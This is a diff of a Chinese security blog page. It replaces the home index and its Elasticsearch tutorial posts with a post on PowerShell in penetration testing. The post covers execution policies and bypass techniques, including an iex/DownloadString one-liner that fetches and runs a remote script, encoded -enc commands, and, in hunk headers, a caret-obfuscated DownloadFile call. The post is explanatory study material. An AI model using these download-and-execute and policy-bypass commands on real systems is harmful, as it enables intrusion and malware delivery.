@@ -81,16 +81,19 @@
 
 
 
-<meta name="description" content="s0lt的学习路程、动人时刻、生活感悟。">
-<meta property="og:type" content="website">
+<meta name="description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
+<meta property="og:type" content="article">
 <meta property="og:title" content="s0lt&#39;s Blog">
-<meta property="og:url" content="https://s0lt.github.io/index.html">
+<meta property="og:url" content="https://s0lt.github.io/2019/02/27/powershell渗透中的学习/index.html">
 <meta property="og:site_name" content="s0lt&#39;s Blog">
-<meta property="og:description" content="s0lt的学习路程、动人时刻、生活感悟。">
+<meta property="og:description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s0lt.github.io/images/celue.png">
+<meta property="og:updated_time" content="2019-02-28T00:50:33.034Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="s0lt&#39;s Blog">
-<meta name="twitter:description" content="s0lt的学习路程、动人时刻、生活感悟。">
+<meta name="twitter:description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
+<meta name="twitter:image" content="https://s0lt.github.io/images/celue.png">
 
 
 
@@ -120,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="https://s0lt.github.io/"/>
+  <link rel="canonical" href="https://s0lt.github.io/2019/02/27/powershell渗透中的学习/"/>
 
 
 
 
 
-  <title>s0lt's Blog</title>
+  <title> | s0lt's Blog</title>
   
 
 
@@ -145,8 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 <a href="https://github.com/s0lt" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -249,9 +251,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -281,9 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/27/powershell渗透中的学习/" itemprop="url">未命名</a></h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -333,9 +333,7 @@
       
 
       
-        
-          
-            <p>本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。</p>
+        <p>本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。</p>
 <h3 id="主要讨论"><a href="#主要讨论" class="headerlink" title="主要讨论"></a>主要讨论</h3><p>Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题</p>
 <h3 id="脚本执行策略"><a href="#脚本执行策略" class="headerlink" title="脚本执行策略"></a>脚本执行策略</h3><p>查看当前系统的策略<br>powershell为了防护恶意脚本的执行，设置了相应的执行策略。<br><code>Get-ExecutionPolicy</code><br>查看系统支持的所有策略<br><code>[System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])</code><br><img src="/images/celue.png" alt=""><br>|策略| 说明 |<br>|–|–|<br>|Unrestricted | 允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示|<br>|RemoteSigned|当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。|<br>|AllSigned|允许执行所有具有数字签名的脚本|<br>|Restriceted|可以执行单个的命令，但是不能执行脚本|<br>|Default|Powershell默认的策略|<br>|Bypass|任何脚本都可以执行，并且不会有安全性提示。|<br>|Undefined|没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略|</p>
 <h4 id="策略的绕过"><a href="#策略的绕过" class="headerlink" title="策略的绕过"></a>策略的绕过</h4><p>使用echo或者type将脚本内容pipe到powershell的标准输入中<br><code>TYPE myScript.ps1 | Powershell.exe -noprofile</code><br>使用-command命令下载脚本并执行<br><code>powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘http://[REMOVED]/myScript.ps1’)”</code><br>使用-enc对命令进行编码<br><code>powershell.exe -enc [ENCODED COMMAND]</code><br>使用执行策略“bypass”或者“unrestricted”<br><code>powershell.exe -ExecutionPolicy bypass -File myScript.ps1</code><br>更改注册表执行策略<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></p>
@@ -423,8 +421,6 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
 <p>常用绕过技术参考：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></p>
 <p>参考：<a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf" target="_blank" rel="noopener">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf</a><br><a href="https://www.cnblogs.com/sparkdev/p/7460518.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/7460518.html</a><br><a href="https://xz.aliyun.com/t/3095" target="_blank" rel="noopener">https://xz.aliyun.com/t/3095</a><br><a href="https://xz.aliyun.com/t/2247" target="_blank" rel="noopener">https://xz.aliyun.com/t/2247</a></p>
 
-          
-        
       
     </div>
     
@@ -441,143 +437,28 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://s0lt.github.io/2019/02/22/Elasticsearch学习(二）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="s0lt">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="s0lt's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/22/Elasticsearch学习(二）/" itemprop="url">未命名</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-22T17:37:31+08:00">
-                2019-02-22
-              </time>
+              <a href="/2019/02/22/Elasticsearch学习(二）/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>使用API来创建、检索、更新和删除文档</p>
-<p>###文档<br>文档可以理解为和对象（JSON键值对结构体，）类似。</p>
-<h4 id="文档元数据"><a href="#文档元数据" class="headerlink" title="文档元数据"></a>文档元数据</h4><p>一个文档不只有数据。它还包含了<strong>元数据(metadata)</strong>——<strong>关于</strong>文档的信息。三个必须的元数据节点是：<br>|节点| 说明 |<br>|–|–|<br>| _index |文档存储的地方，类似关系型数据库中的“数据库”，但索引是分片的逻辑存储空间，数据被存储和索引在分片中。索引名字必须是全部小写，不能以下划线开头，不能包含逗号 |<br>|_type|文档代表的对象的类，<code>_type</code>的名字可以是大写或小写，不能包含下划线或逗号|<br>|_id|文档的唯一标识|<br>|_version|文档版本号，每当文档变化（包括删除）都会使<code>_version</code>增加|<br>|_source|创建索引时发送的原始文档,GET /website/blog/123?_source=title,text  部分检索|<br>|</p>
-<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>自定义文档ID<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /&#123;index&#125;/&#123;type&#125;/&#123;id&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;field&quot;: &quot;value&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>设置自增ID，使用POST，只需要_index和_type<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123;</span><br><span class="line">  &quot;title&quot;: &quot;My second blog entry&quot;,</span><br><span class="line">  &quot;text&quot;:  &quot;Still trying this out...&quot;,</span><br><span class="line">  &quot;date&quot;:  &quot;2014/01/01&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h4 id="someAPI"><a href="#someAPI" class="headerlink" title="someAPI"></a>someAPI</h4><p>_update合并更新到文档中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/1/_update</span><br></pre></td></tr></table></figure></p>
-<p><code>mget</code> API参数是一个<code>docs</code>数组，数组的每个节点定义一个文档的<code>_index</code>、<code>_type</code>、<code>_id</code>元数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/_mget</span><br><span class="line">&#123;</span><br><span class="line">   &quot;docs&quot; : [</span><br><span class="line">      &#123; &quot;_id&quot; : 2 &#125;,</span><br><span class="line">      &#123; &quot;_type&quot; : &quot;pageviews&quot;, &quot;_id&quot; :   1 &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><code>bulk</code> API允许我们使用单一请求来实现多个文档的<code>create</code>、<code>index</code>、<code>update</code>或<code>delete</code>。<br>暂时到这里，很多东西遇到后在来总结。</p>
-<h4 id="空搜索"><a href="#空搜索" class="headerlink" title="空搜索"></a>空搜索</h4><p>测试用例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /_bulk</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;user&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;1&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;email&quot; : &quot;john@smith.com&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;username&quot; : &quot;@john&quot; &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;user&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;2&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;email&quot; : &quot;mary@jones.com&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;username&quot; : &quot;@mary&quot; &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;3&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-13&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Elasticsearch means full text search has never been so easy&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;4&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-14&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;@mary it is not just text, it does everything&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;5&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-15&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;However did I manage before Elasticsearch?&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;6&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-16&quot;, &quot;name&quot; : &quot;John Smith&quot;,  &quot;tweet&quot; : &quot;The Elasticsearch API is really easy to use&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;7&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-17&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;The Query DSL is really powerful and flexible&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;8&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-18&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;9&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-19&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Geo-location aggregations are really cool&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;10&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-20&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;Elasticsearch surely is one of the hottest new NoSQL products&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;11&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-21&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;Elasticsearch is built for the cloud, easy to scale&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;12&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-22&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;Elasticsearch and I have left the honeymoon stage, and I still love her.&quot;, &quot;user_id&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;13&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-23&quot;, &quot;name&quot; : &quot;Mary Jones&quot;, &quot;tweet&quot; : &quot;So yes, I am an Elasticsearch fanboy&quot;, &quot;user_id&quot; : 2 &#125;</span><br><span class="line">&#123; &quot;create&quot;: &#123; &quot;_index&quot;: &quot;tweet&quot;, &quot;_type&quot;: &quot;doc&quot;, &quot;_id&quot;: &quot;14&quot; &#125;&#125;</span><br><span class="line">&#123; &quot;date&quot; : &quot;2014-09-24&quot;, &quot;name&quot; : &quot;John Smith&quot;, &quot;tweet&quot; : &quot;How many more cheesy tweets do I have to write?&quot;, &quot;user_id&quot; : 1 &#125;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /_search</span><br></pre></td></tr></table></figure>
-<p><img src="/images/_search.png" alt=""><br><code>took</code>告诉我们整个搜索请求花费的毫秒数。<br><code>_shards</code>节点告诉我们参与查询的分片数（<code>total</code>字段），有多少是成功的（<code>successful</code>字段），有多少的是失败的（<code>failed</code>字段）。<br><code>time_out</code>值告诉我们查询超时与否</p>
-<h4 id="多索引多类别"><a href="#多索引多类别" class="headerlink" title="多索引多类别"></a>多索引多类别</h4><p> <code>/_search</code><br>在所有索引的所有类型中搜索<br><code>/gb/_search</code><br>在索引<code>gb</code>的所有类型中搜索<br><code>/gb,us/_search</code><br>在索引<code>gb</code>和<code>us</code>的所有类型中搜索<br><code>/g*,u*/_search</code><br>在以<code>g</code>或<code>u</code>开头的索引的所有类型中搜索<br> <code>/gb/user/_search</code><br>在索引<code>gb</code>的类型<code>user</code>中搜索<br><code>/gb,us/user,tweet/_search</code><br>在索引<code>gb</code>和<code>us</code>的类型为<code>user</code>和<code>tweet</code>中搜索<br> <code>/_all/user,tweet/_search</code><br>在所有索引的<code>user</code>和<code>tweet</code>中搜索 search types  <code>user</code>  and  <code>tweet</code>  in all indices</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -587,145 +468,11 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://s0lt.github.io/2019/02/21/Elasticsearch学习（一）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="s0lt">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="s0lt's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/21/Elasticsearch学习（一）/" itemprop="url">Elasticsearch学习（一）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-21T17:29:24+08:00">
-                2019-02-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>在Elasticsearch中，文档归属于一种类型(type),而这些类型存在于索引(index)中，我们可以画一些简单的对比图来类比传统关系型数据库：<br><code>Relational DB -&gt; Databases -&gt; Tables -&gt; Rows -&gt; Columns</code><br><code>Elasticsearch -&gt; Indices   -&gt; Types  -&gt; Documents -&gt; Fields</code></p>
-<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><h4 id="简单搜索"><a href="#简单搜索" class="headerlink" title="简单搜索"></a>简单搜索</h4><p>通过执行HTTP GET请求并指出文档的“地址”——索引、类型和ID既可。根据这三部分信息，我们就可以返回原始JSON文档：<br>我们通过HTTP方法<code>GET</code>来检索文档，同样的，我们可以使用<code>DELETE</code>方法删除文档，使用<code>HEAD</code>方法检查某文档是否存在。如果想更新已存在的文档，我们只需再<code>PUT</code>一次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br></pre></td></tr></table></figure></p>
-<p>搜索全部文档，默认返回前10个结果，包含在hits数组中。<br>查询字符串搜索（姓氏中包含Smith的文档）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search?q=last_name:Smith</span><br></pre></td></tr></table></figure></p>
-<h4 id="DSL语句查询：以JSON请求体的形式出现。（查询同上）"><a href="#DSL语句查询：以JSON请求体的形式出现。（查询同上）" class="headerlink" title="DSL语句查询：以JSON请求体的形式出现。（查询同上）"></a>DSL语句查询：以JSON请求体的形式出现。（查询同上）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match&quot; : &#123;</span><br><span class="line">            &quot;last_name&quot; : &quot;Smith&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="过滤器-filter），结构化搜索"><a href="#过滤器-filter），结构化搜索" class="headerlink" title="过滤器(filter），结构化搜索"></a>过滤器(filter），结构化搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;filtered&quot; : &#123;</span><br><span class="line">            &quot;filter&quot; : &#123;</span><br><span class="line">                &quot;range&quot; : &#123;</span><br><span class="line">                    &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;query&quot; : &#123;</span><br><span class="line">                &quot;match&quot; : &#123;</span><br><span class="line">                    &quot;last_name&quot; : &quot;smith&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>运行错误<br><img src="/images/error.png" alt=""><br>原因： 过滤查询已被弃用，并在ES 5.0中删除。<br>解决： 使用bool / must / filter查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;bool&quot; : &#123;</span><br><span class="line">            &quot;filter&quot; : &#123;</span><br><span class="line">                &quot;range&quot; : &#123;</span><br><span class="line">                    &quot;age&quot; : &#123; &quot;gt&quot; : 30 &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;must&quot; : &#123;</span><br><span class="line">                &quot;match&quot; : &#123;</span><br><span class="line">                    &quot;last_name&quot; : &quot;smith&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h4 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h4><p>搜索所有喜欢 <strong>“rock climbing”</strong> 的员工：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>搜索结果会根据elasticsearch的相关性结果评分对文档进行排序。所谓相关性，就是搜索条件和文档的匹配程度。</p>
-<h4 id="短词搜索"><a href="#短词搜索" class="headerlink" title="短词搜索"></a>短词搜索</h4><p>只要将<code>match</code>查询变更为<code>match_phrase</code>查询即可:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /megacorp/employee/_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot; : &#123;</span><br><span class="line">        &quot;match_phrase&quot; : &#123;</span><br><span class="line">            &quot;about&quot; : &quot;rock climbing&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
